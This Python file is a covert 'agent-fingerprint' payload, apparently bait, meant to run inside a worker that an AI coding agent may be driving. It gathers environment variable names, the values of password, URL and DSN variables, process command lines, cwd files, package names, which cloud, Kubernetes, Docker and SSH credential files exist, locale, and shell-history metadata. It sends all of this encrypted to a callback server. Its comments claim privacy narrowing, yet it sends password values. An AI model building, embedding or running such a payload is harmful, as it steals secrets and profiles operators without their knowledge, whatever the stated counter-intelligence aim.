#!/usr/bin/env python3
# agent-fingerprint payload
#
# Runs INSIDE the target worker. Collects raw-but-narrow harness-fingerprint material and
# POSTs it, encrypted, to the edge. The brain-side listener.py resolves that raw material
# into the same field set this payload used to compute locally, then runs RuleInference
# over it to attribute the agent harness driving the worker.
#
# OPERATOR RECON (2026-07-23, additive): alongside the harness-fingerprint fields, this
# payload also collects a small set of operator/actor-intel signals that are useful
# regardless of which harness is driving the worker -- credential/access-surface presence
# (cred_surface), locale/timezone (locale), and shell-history metadata (history). These are
# NOT part of the harness-fingerprint Report/FIELDS vocabulary and are never scored by
# RuleInference -- the listener lifts them straight into AnalyzerOutput.details. Presence
# and metadata only: no credential file contents, no shell-history command text, no env
# values beyond what the fingerprint half already reads (see listener.py's module
# docstring for the full split).
#
# Adapted from the upstream `fingerprint_engine` research prototype (its `grabber.py` and
# `probes/__init__.py`). That prototype is not part of this repository and does not ship
# with it; everything needed to build and run this bait is here and in listener.py.
#
# SPLIT (2026-07-23, size optimization): the noise-filtering knowledge base (which env
# vars / cwd entries / value tokens are generic OS clutter vs. harness-owned signal --
# GENERIC_ENV, GENERIC_PREFIXES, PROVIDER_PREFIXES, GENERIC_CWD_TOKENS,
# GENERIC_VALUE_TOKENS and the functions that apply them) moved server-side into
# listener.py. None of that filtering needs to run on the target -- only the OS-facing
# collection does. This payload now sends narrower-but-raw material (env var NAMES, not
# values; cwd basenames; and only the few env VALUES already worth reading -- PS1 and
# *_PASSWORD/_PASS/_URI/_URL/_DSN-suffixed vars, never arbitrary env values) and the
# listener applies the same filtering knowledge base there instead. This roughly halves
# the bundled artifact's size (the noise-filtering tables were ~45% of it) at the cost of
# a larger wire body per hit (still far under the edge's MAX_BODY_BYTES, default 64KiB) --
# a straight trade of embedded-artifact size for wire-body size, needed so this payload
# fits inside delivery mechanisms with a small embedding budget (e.g. the pwcrypt vessel's
# 4096-byte vault header). See listener.py's module docstring for the resolve-side half of
# this contract, and FIELDS for the raw wire vocabulary (envk/cwdnames/boolenv/valenv).
#
# Injected by the factory at build time:
#   _SERVER_URL  — edge HTTPS callback URL, e.g. "http://127.0.0.1:8443"
#   _TOKEN       — instance_token (16-char hex, 8 bytes)
#   _KEY         — master key (64-char hex, 32 bytes raw) for the HMAC-SHA256 AEAD
#
# blacksea.sdk.payload.* is inlined by the bundler — pure stdlib, no third-party
# imports anywhere on this path (runs on any Python 3.11+, no project venv needed).
from blacksea.sdk.payload.http import send_https_encrypted
import os
import re
import json
import time
from datetime import datetime

# ─────────────────────────────────────────────────────────────────────────────
# What stays local: small, single-purpose, no big lookup tables -- moving these
# server-side would cost more wire bytes (full process/argv trees, all env values)
# than the noise-filtering tables they'd save. Verbatim from that upstream prototype's
# probes/__init__.py, renamed with an fp_ prefix only to avoid any collision with the
# bundler-inlined comms source.
# ─────────────────────────────────────────────────────────────────────────────

SHELLS = {"sh", "bash", "zsh", "dash", "ash", "fish", "cmd.exe", "powershell"}

_NAMED_SUFFIX_LIT = re.compile(r"^([a-z][a-z0-9-]*?)-[0-9a-f]{6,}$")

# Which env entries are worth sending a VALUE for at all -- a privacy/size narrowing,
# not the noise-filtering that moved server-side. PS1 and *_PASSWORD/_PASS/_URI/_URL/_DSN
# are the only value-carrying keys any downstream reduction ever inspected; every other
# env value (PATH, secrets, arbitrary vars) is never read past its key name.
_VALUE_CARRIER_SUFFIXES = ("_PASSWORD", "_PASS", "_URI", "_URL", "_DSN")


def fp_hostname_literal(env):
    """The literal, non-hex prefix of a named-suffixed hostname."""
    h = env.get("HOSTNAME")
    if not h:
        return None
    m = _NAMED_SUFFIX_LIT.match(h)
    return m.group(1) if m else None


def fp_child_binaries(procs):
    """Non-shell binary basenames in the process tree."""
    out = set()
    for p in procs:
        argv = p.get("argv") or []
        if not argv:
            continue
        base = str(argv[0]).rsplit("/", 1)[-1]
        if base in SHELLS:
            continue
        if base in ("python", "python3", "node", "ruby", "perl") and len(argv) > 2:
            for tok in argv[1:3]:
                if not str(tok).startswith("-"):
                    out.add(str(tok).rsplit("/", 1)[-1])
                    break
            out.add(base)
        else:
            out.add(base)
    return sorted(out)


def fp_model_strings(env):
    """Values of any var that directly names a model."""
    return sorted({v for k, v in env.items()
                   if k.endswith("_MODEL") and isinstance(v, str) and v and "," not in v})


# ─────────────────────────────────────────────────────────────────────────────
# OS telemetry collection — the production implementation of the engine's
# `World` protocol, read straight off the real OS. Each collector is guarded so
# the payload never crashes on a partial read (env / fs / proc may be restricted).
# ─────────────────────────────────────────────────────────────────────────────

def _collect_env():
    return dict(os.environ)


def _collect_files():
    """cwd-local entries — the only filesystem surface the minimal grabber reads
    (cwd_family). Home dotfiles are NOT collected: MinimalGrabber never calls
    dotfile_family, so paying to read $HOME would waste local work for no wire
    field."""
    files = []
    try:
        cwd = os.getcwd()
        for name in os.listdir(cwd):
            files.append({"path": os.path.join(cwd, name), "in_cwd": True})
    except OSError:
        # os.getcwd() itself can raise (e.g. cwd deleted out from under the process,
        # a real occurrence in ephemeral containers) -- not just os.listdir().
        pass
    return files


def _collect_processes():
    """Process argv lists from /proc (Linux containers). Non-Linux or a
    restricted /proc yields [] and child_binaries contributes nothing — the
    inference engine treats a missing field as MISSING, never a mismatch."""
    procs = []
    try:
        pids = os.listdir("/proc")
    except OSError:
        return procs
    for pid in pids:
        if not pid.isdigit():
            continue
        try:
            with open("/proc/%s/cmdline" % pid, "rb") as f:
                raw = f.read()
        except OSError:
            continue
        if not raw:
            continue
        argv = [a.decode("utf-8", "replace") for a in raw.split(b"\0") if a]
        if argv:
            procs.append({"argv": argv})
    return procs


def _collect_packages():
    """Package-manifest names from cwd and $HOME: pyproject.toml ([project]/poetry),
    package.json (name), go.mod (module path). Mirrors the engine's SimpleWorld
    package fixture shape {name: {"name": name})."""
    pkgs = {}
    seen = set()
    bases = []
    try:
        candidates = (os.getcwd(), os.path.expanduser("~"))
    except OSError:
        # os.getcwd() can raise (cwd deleted out from under the process); fall back
        # to $HOME alone rather than losing package detection entirely.
        candidates = (os.path.expanduser("~"),)
    for base in candidates:
        if base and base not in bases:
            bases.append(base)
    for base in bases:
        pp = os.path.join(base, "pyproject.toml")
        if os.path.isfile(pp):
            try:
                import tomllib
                with open(pp, "rb") as f:
                    d = tomllib.load(f)
                name = (d.get("project") or {}).get("name")
                if not name:
                    name = ((d.get("tool") or {}).get("poetry") or {}).get("name")
                if name and name not in seen:
                    pkgs[name] = {"name": name}
                    seen.add(name)
            except Exception:
                pass
        pj = os.path.join(base, "package.json")
        if os.path.isfile(pj):
            try:
                with open(pj, "r") as f:
                    d = json.load(f)
                name = d.get("name")
                if name and name not in seen:
                    pkgs[name] = {"name": name}
                    seen.add(name)
            except Exception:
                pass
        gm = os.path.join(base, "go.mod")
        if os.path.isfile(gm):
            try:
                with open(gm, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith("module "):
                            name = line.split(None, 1)[1].strip()
                            if name and name not in seen:
                                pkgs[name] = {"name": name}
                                seen.add(name)
                            break
            except Exception:
                pass
    return pkgs


# ─────────────────────────────────────────────────────────────────────────────
# Operator recon — presence/metadata only, never contents. Small and single-purpose
# like the fp_* collectors above, but unrelated to harness attribution: these answer
# "who is operating this worker and what do they have access to", not "which coding
# agent is driving it".
# ─────────────────────────────────────────────────────────────────────────────

_CRED_FILES = {
    "aws": "~/.aws/credentials",
    "gcloud": "~/.config/gcloud",
    "kube": "~/.kube/config",
    "docker": "~/.docker/config.json",
}


def _collect_cred_surface():
    """Which well-known credential/access surfaces exist -- filenames checked for
    existence only, contents never read. A signal of what infrastructure the operator's
    environment has standing access to (cloud accounts, clusters, other SSH targets),
    independent of which harness is driving this particular worker."""
    surface = {name for name, rel in _CRED_FILES.items() if os.path.exists(os.path.expanduser(rel))}
    try:
        for name in os.listdir(os.path.expanduser("~/.ssh")):
            if name.startswith("id_") and not name.endswith(".pub"):
                surface.add("ssh")
                break
    except OSError:
        pass
    return sorted(surface)


def _collect_locale():
    """Timezone + language -- an OSINT signal for the operator's geographic origin /
    working hours, distinct from the GENERIC_ENV/GENERIC_PREFIXES noise filter that
    deliberately discards TZ/LANG/LC_* for harness attribution (right there, wrong here)."""
    out = {}
    try:
        offset = datetime.now().astimezone().utcoffset()
        if offset is not None:
            out["utc_offset_min"] = int(offset.total_seconds() // 60)
    except Exception:
        pass
    if time.tzname and time.tzname[0]:
        out["tz_name"] = time.tzname[0]
    lang = os.environ.get("LANG")
    if lang:
        out["lang"] = lang
    return out


_HISTORY_FILES = (".bash_history", ".zsh_history", ".python_history")


def _collect_history():
    """Shell/REPL history file metadata (size + mtime) -- never the command text
    itself. A rough freshness/activity proxy: empty or absent history suggests
    throwaway infra spun up for this task; a large, old one suggests a persistent
    operator box."""
    out = {}
    home = os.path.expanduser("~")
    for fname in _HISTORY_FILES:
        try:
            st = os.stat(os.path.join(home, fname))
        except OSError:
            continue
        out[fname.lstrip(".")] = {"size": st.st_size, "mtime": int(st.st_mtime)}
    return out


# ─────────────────────────────────────────────────────────────────────────────
# Collect + narrow. Fields computed locally (host_lit/bins/model/pkg) are sent as
# before; fields whose reduction moved server-side (ns/ns_n, disc_k, cwd/cwd_n,
# valtok) are replaced by their raw precursor (envk/boolenv/cwdnames/valenv) --
# see listener.py's _resolve_report() for the server-side half.
#
# Every individual field is computed through _safe() (below): every collector already
# guards its own OS calls, but this is a second, unconditional layer so that a bug or a
# truly unanticipated platform quirk in ANY one field never takes down the ones around
# it, and never prevents the beacon from sending at all -- worst case a field is simply
# missing, exactly like an unreadable file or a restricted /proc already degrade today.
# ─────────────────────────────────────────────────────────────────────────────

def _safe(fn, default):
    try:
        return fn()
    except Exception:
        return default


_env = _safe(_collect_env, {})
_files = _safe(_collect_files, [])
_procs = _safe(_collect_processes, [])
_pkgs = _safe(_collect_packages, {})

_host_lit = _safe(lambda: fp_hostname_literal(_env), None)
_bins = _safe(lambda: fp_child_binaries(_procs), [])
_ms = _safe(lambda: fp_model_strings(_env), [])
_model = _ms[0] if _ms else None

_pkg_names = _safe(
    lambda: sorted({v.get("name") for v in _pkgs.values()
                     if isinstance(v, dict) and v.get("name")}),
    [],
)
_pkg = _pkg_names[0] if _pkg_names else None

# Raw precursors for the server-side reductions.
_envk = _safe(lambda: sorted(_env.keys()), [])
_cwdnames = _safe(
    lambda: sorted({
        f["path"].rstrip("/").rsplit("/", 1)[-1] for f in _files if f.get("in_cwd")
    }),
    [],
)
_boolenv = _safe(
    lambda: {k: v for k, v in _env.items() if str(v) in ("1", "true", "True")}, {}
)
_valenv = _safe(
    lambda: {
        k: v for k, v in _env.items()
        if isinstance(v, str) and (k == "PS1" or k.endswith(_VALUE_CARRIER_SUFFIXES))
    },
    {},
)

# Operator recon -- see the collectors' own docstrings above.
_cred_surface = _safe(_collect_cred_surface, [])
_locale = _safe(_collect_locale, {})
_history = _safe(_collect_history, {})

# Only non-empty fields count toward wire size (Report.put semantics).
_report = {}


def _put(key, value):
    if value is None or value == [] or value == {} or value == "":
        return
    _report[key] = value


_put("host_lit", _host_lit)
_put("pkg", _pkg)
_put("bins", _bins)
_put("model", _model)
_put("envk", _envk)
_put("cwdnames", _cwdnames)
_put("boolenv", _boolenv)
_put("valenv", _valenv)
_put("cred_surface", _cred_surface)
_put("locale", _locale)
_put("history", _history)

# send_https_encrypted already swallows all errors internally (network/envelope
# failures never raise -- see blacksea.sdk.payload.http); this guards the one step
# before it, json.dumps, so a truly unexpected value slipping past every _safe()
# above still can't raise out of the module.
try:
    _body = json.dumps(_report, sort_keys=True, separators=(",", ":")).encode()
    send_https_encrypted(
        _SERVER_URL, _body, _KEY, _TOKEN  # noqa: F821
    )
except Exception:
    pass
